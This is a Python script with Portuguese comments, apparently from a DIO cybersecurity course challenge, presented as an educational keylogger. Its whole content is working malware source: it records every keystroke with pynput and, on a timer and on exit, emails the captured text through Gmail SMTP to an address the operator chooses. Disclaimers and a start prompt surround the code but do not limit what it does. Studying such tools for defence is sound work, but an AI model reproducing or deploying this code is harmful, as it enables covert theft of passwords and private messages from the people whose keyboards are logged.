#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Keylogger com Envio por E-mail - APENAS PARA FINS EDUCACIONAIS
===============================================================

AVISO: Este script √© para fins educacionais apenas.
Demonstra como keyloggers podem enviar dados capturados.

Autor: DIO - Desafio de Ciberseguran√ßa
Data: 2025
"""

import os
import sys
from datetime import datetime
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading
import time


class KeyloggerEmail:
    """
    Keylogger que envia logs por e-mail periodicamente.
    """
    
    def __init__(self, email_destino, email_remetente, senha_email, intervalo=300):
        """
        Inicializa o keylogger com funcionalidade de e-mail.
        
        Args:
            email_destino (str): E-mail para onde enviar os logs
            email_remetente (str): E-mail remetente (Gmail recomendado)
            senha_email (str): Senha ou app password do e-mail
            intervalo (int): Intervalo em segundos para envio (padr√£o: 300 = 5 min)
        """
        self.email_destino = email_destino
        self.email_remetente = email_remetente
        self.senha_email = senha_email
        self.intervalo = intervalo
        
        self.teclas_capturadas = []
        self.executando = False
        self.listener = None
        self.timer_envio = None
        self.tempo_inicio = None
        
    def on_press(self, tecla):
        """
        Callback para captura de teclas.
        """
        try:
            tecla_str = tecla.char
        except AttributeError:
            # Teclas especiais
            teclas_especiais = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '\n',
                keyboard.Key.tab: '\t',
                keyboard.Key.backspace: '[BACK]',
                keyboard.Key.shift: '',
                keyboard.Key.ctrl: '',
                keyboard.Key.alt: '',
            }
            tecla_str = teclas_especiais.get(tecla, f'[{tecla}]')
        
        if tecla_str:
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.teclas_capturadas.append((timestamp, tecla_str))
    
    def enviar_email(self):
        """
        Envia os logs capturados por e-mail.
        """
        if not self.teclas_capturadas:
            print("[*] Nenhuma tecla para enviar ainda...")
            return
        
        try:
            # Prepara o conte√∫do do e-mail
            conteudo = self._formatar_log()
            
            # Cria a mensagem
            mensagem = MIMEMultipart()
            mensagem['From'] = self.email_remetente
            mensagem['To'] = self.email_destino
            mensagem['Subject'] = f"Keylog - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            
            corpo = MIMEText(conteudo, 'plain', 'utf-8')
            mensagem.attach(corpo)
            
            # Envia via SMTP (Gmail)
            print("[*] Conectando ao servidor SMTP...")
            servidor = smtplib.SMTP('smtp.gmail.com', 587)
            servidor.starttls()
            servidor.login(self.email_remetente, self.senha_email)
            
            texto = mensagem.as_string()
            servidor.sendmail(self.email_remetente, self.email_destino, texto)
            servidor.quit()
            
            print(f"[+] E-mail enviado com sucesso! ({len(self.teclas_capturadas)} teclas)")
            
            # Limpa o buffer ap√≥s envio bem-sucedido
            self.teclas_capturadas.clear()
            
        except smtplib.SMTPAuthenticationError:
            print("[!] Erro de autentica√ß√£o. Verifique e-mail e senha.")
            print("    Dica: Use uma 'Senha de App' se tiver 2FA ativado.")
        except Exception as e:
            print(f"[!] Erro ao enviar e-mail: {str(e)}")
    
    def _formatar_log(self):
        """
        Formata o log capturado para envio.
        
        Returns:
            str: Log formatado
        """
        linhas = [
            "="*60,
            "KEYLOGGER - RELAT√ìRIO DE CAPTURA",
            "="*60,
            f"\nPer√≠odo: {self.tempo_inicio.strftime('%Y-%m-%d %H:%M:%S')} at√© {datetime.now().strftime('%H:%M:%S')}",
            f"Total de teclas: {len(self.teclas_capturadas)}\n",
            "="*60,
            "\nTECLAS CAPTURADAS:\n"
        ]
        
        # Agrupa por timestamp
        texto_capturado = ""
        for timestamp, tecla in self.teclas_capturadas:
            texto_capturado += tecla
        
        linhas.append(texto_capturado)
        linhas.append("\n" + "="*60)
        linhas.append("\n‚ö†Ô∏è  Este √© um log educacional - DIO.ME")
        
        return "\n".join(linhas)
    
    def agendar_envio(self):
        """
        Agenda o pr√≥ximo envio de e-mail.
        """
        if self.executando:
            self.enviar_email()
            # Agenda o pr√≥ximo envio
            self.timer_envio = threading.Timer(self.intervalo, self.agendar_envio)
            self.timer_envio.daemon = True
            self.timer_envio.start()
    
    def iniciar(self):
        """
        Inicia o keylogger com envio por e-mail.
        """
        if self.executando:
            print("[!] Keylogger j√° est√° em execu√ß√£o!")
            return
        
        self.executando = True
        self.tempo_inicio = datetime.now()
        
        print(f"[+] Keylogger iniciado!")
        print(f"[*] Enviando logs para: {self.email_destino}")
        print(f"[*] Intervalo de envio: {self.intervalo} segundos")
        print(f"[*] Pressione ESC para parar\n")
        
        # Inicia o listener
        self.listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        self.listener.start()
        
        # Inicia o timer de envio
        self.agendar_envio()
    
    def on_release(self, tecla):
        """
        Callback para tecla solta. Para quando ESC √© pressionado.
        """
        if tecla == keyboard.Key.esc:
            return False
        return True
    
    def parar(self):
        """
        Para o keylogger e envia logs finais.
        """
        if not self.executando:
            return
        
        self.executando = False
        
        # Cancela timer se existir
        if self.timer_envio:
            self.timer_envio.cancel()
        
        # Envia logs finais
        print("\n[*] Enviando logs finais...")
        self.enviar_email()
        
        tempo_fim = datetime.now()
        duracao = tempo_fim - self.tempo_inicio
        
        print(f"\n[+] Keylogger parado!")
        print(f"[*] Dura√ß√£o total: {duracao}")
    
    def aguardar(self):
        """
        Aguarda o listener terminar.
        """
        if self.listener:
            self.listener.join()
            self.parar()


def configurar_email():
    """
    Solicita configura√ß√µes de e-mail ao usu√°rio.
    
    Returns:
        tuple: (email_destino, email_remetente, senha, intervalo)
    """
    print("\n" + "="*60)
    print("  CONFIGURA√á√ÉO DE E-MAIL")
    print("="*60)
    print("\n‚ö†Ô∏è  Para usar Gmail, voc√™ precisa:")
    print("   1. Ativar 'Acesso de apps menos seguros' OU")
    print("   2. Criar uma 'Senha de App' (recomendado com 2FA)")
    print("\n   Tutoriais: https://support.google.com/accounts/answer/185833")
    print()
    
    email_remetente = input("E-mail remetente (Gmail): ").strip()
    senha = input("Senha ou App Password: ").strip()
    email_destino = input("E-mail destino (para receber logs): ").strip()
    
    intervalo_str = input("Intervalo de envio em segundos [300]: ").strip()
    intervalo = int(intervalo_str) if intervalo_str else 300
    
    return email_destino, email_remetente, senha, intervalo


def main():
    """
    Fun√ß√£o principal.
    """
    print("\n" + "="*60)
    print("  KEYLOGGER COM E-MAIL - FINS EDUCACIONAIS")
    print("="*60)
    print("\n‚ö†Ô∏è  AVISO: Este script √© apenas para fins educacionais!")
    print("    Demonstra como keyloggers podem exfiltrar dados.")
    print("    Use apenas em ambientes de teste controlados.\n")
    
    resposta = input("Deseja continuar? (sim/n√£o): ").lower()
    if resposta not in ['sim', 's', 'yes', 'y']:
        print("\n[*] Opera√ß√£o cancelada.")
        sys.exit(0)
    
    # Configura√ß√£o de e-mail
    email_destino, email_remetente, senha, intervalo = configurar_email()
    
    if not all([email_destino, email_remetente, senha]):
        print("\n[!] Erro: Todos os campos s√£o obrigat√≥rios!")
        sys.exit(1)
    
    print("\n" + "="*60)
    print("  INICIANDO KEYLOGGER")
    print("="*60)
    print("\n1. O keylogger capturar√° teclas continuamente")
    print(f"2. Enviar√° logs a cada {intervalo} segundos")
    print("3. Pressione ESC para parar e enviar logs finais\n")
    
    input("Pressione ENTER para iniciar...")
    
    # Inicializa o keylogger
    keylogger = KeyloggerEmail(
        email_destino=email_destino,
        email_remetente=email_remetente,
        senha_email=senha,
        intervalo=intervalo
    )
    
    try:
        keylogger.iniciar()
        keylogger.aguardar()
        
        print("\n" + "="*60)
        print("  SIMULA√á√ÉO CONCLU√çDA")
        print("="*60)
        print("\nüìß Logs enviados por e-mail!")
        print("üìö Revise a documenta√ß√£o sobre preven√ß√£o\n")
        
    except KeyboardInterrupt:
        print("\n\n[!] Interrompido pelo usu√°rio")
        keylogger.parar()
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Erro: {str(e)}")
        keylogger.parar()
        sys.exit(1)


if __name__ == "__main__":
    main()
